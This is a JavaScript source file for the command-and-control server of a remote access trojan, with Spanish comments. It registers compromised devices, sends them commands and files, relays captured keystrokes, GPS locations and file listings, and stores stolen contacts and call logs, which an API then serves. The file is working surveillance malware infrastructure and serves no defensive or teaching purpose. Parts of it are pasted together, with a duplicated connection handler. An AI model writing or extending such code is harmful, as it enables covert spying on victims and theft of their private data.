const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const multer = require('multer');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));
app.use('/uploads', express.static('uploads'));

const sessions = new Map();
const upload = multer({ dest: 'uploads/', limits: { fileSize: 50 * 1024 * 1024 } });
let sessionCounter = 0;
// ... (mismo encabezado que tu código anterior)

io.on('connection', (socket) => {
  // ... (mismo registro de agente)

  // NUEVO: Guardar Contactos
  socket.on('contacts-list', (data) => {
    const fileName = `uploads/contacts_${socket.sessionId}.json`;
    fs.writeFileSync(fileName, JSON.stringify(data, null, 2));
    console.log(`📂 Contactos guardados para ${socket.sessionId}`);
  });

  // NUEVO: Guardar Historial de Llamadas
  socket.on('call-logs', (data) => {
    const fileName = `uploads/calls_${socket.sessionId}.json`;
    fs.writeFileSync(fileName, JSON.stringify(data, null, 2));
    console.log(`📞 Historial de llamadas guardado para ${socket.sessionId}`);
  });

  // Reenvío al dashboard para visualización en tiempo real
  socket.on('contacts-list', (data) => io.to(socket.sessionId).emit('dashboard-contacts', data));
  socket.on('call-logs', (data) => io.to(socket.sessionId).emit('dashboard-calls', data));
});

// Endpoint adicional para ver datos extraídos
app.get('/api/data/:sessionId/:type', (req, res) => {
  const { sessionId, type } = req.params; // type: contacts o calls
  const filePath = path.join(__dirname, 'uploads', `${type}_${sessionId}.json`);
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.status(404).send("No hay datos extraídos aún.");
  }
});

io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);

  socket.on('register-agent', (data) => {
    const sessionId = `agent_${++sessionCounter}_${Date.now()}`;
    sessions.set(sessionId, {
      socketId: socket.id,
      agentId: data.agentId || sessionId,
      deviceInfo: data.deviceInfo || {},
      lastSeen: new Date()
    });
    
    socket.join(sessionId);
    socket.sessionId = sessionId;
    
    socket.broadcast.emit('new-agent', {
      sessionId, agentId: data.agentId, deviceInfo: data.deviceInfo
    });
    console.log(`Agent registered: ${sessionId}`);
  });

  socket.on('stream-data', (data) => {
    const sessionId = socket.sessionId;
    if (sessionId && sessions.has(sessionId)) {
      io.to(sessionId).emit('stream-data', data);
    }
  });

  socket.on('control-command', (data) => {
    const targetSession = data.sessionId;
    if (sessions.has(targetSession)) {
      io.to(sessions.get(targetSession).socketId).emit('command', data.command);
    }
  });

  // New features
  socket.on('keystroke', (data) => {
    const sessionId = socket.sessionId;
    if (sessionId && sessions.has(sessionId)) {
      io.to(sessionId).emit('keystroke', data);
    }
  });

  socket.on('file-list', (data) => {
    const sessionId = socket.sessionId;
    if (sessionId && sessions.has(sessionId)) {
      io.to(sessionId).emit('file-list', data);
    }
  });

  socket.on('gps-location', (data) => {
    const sessionId = socket.sessionId;
    if (sessionId && sessions.has(sessionId)) {
      io.to(sessionId).emit('gps-location', data);
    }
  });

  socket.on('disconnect', () => {
    if (socket.sessionId && sessions.has(socket.sessionId)) {
      const sessionInfo = sessions.get(socket.sessionId);
      sessions.delete(socket.sessionId);
      io.emit('agent-disconnected', {
        sessionId: socket.sessionId,
        agentId: sessionInfo.agentId
      });
    }
  });
});

app.post('/api/command/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  if (sessions.has(sessionId)) {
    io.to(sessions.get(sessionId).socketId).emit('command', req.body.command);
    res.json({ success: true });
  } else {
    res.status(404).json({ error: 'Session not found' });
  }
});

app.get('/api/sessions', (req, res) => {
  res.json(Array.from(sessions.entries()).map(([id, data]) => ({
    sessionId: id, ...data, lastSeen: data.lastSeen.toISOString()
  })));
});

app.post('/api/upload/:sessionId', upload.single('file'), (req, res) => {
  const sessionId = req.params.sessionId;
  if (sessions.has(sessionId)) {
    const filePath = path.join(__dirname, 'uploads', req.file.filename);
    io.to(sessions.get(sessionId).socketId).emit('file-upload', {
      filename: req.file.originalname,
      filepath: filePath
    });
    res.json({ success: true, filename: req.file.filename });
  } else {
    res.status(404).json({ error: 'Session not found' });
  }
});

app.get('/**', (req, res) => {
  res.sendFile(path.join(__dirname, 'client', 'build', 'index.html'));
});

const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`🚀 RAT Server running on http://localhost:${PORT}`);
});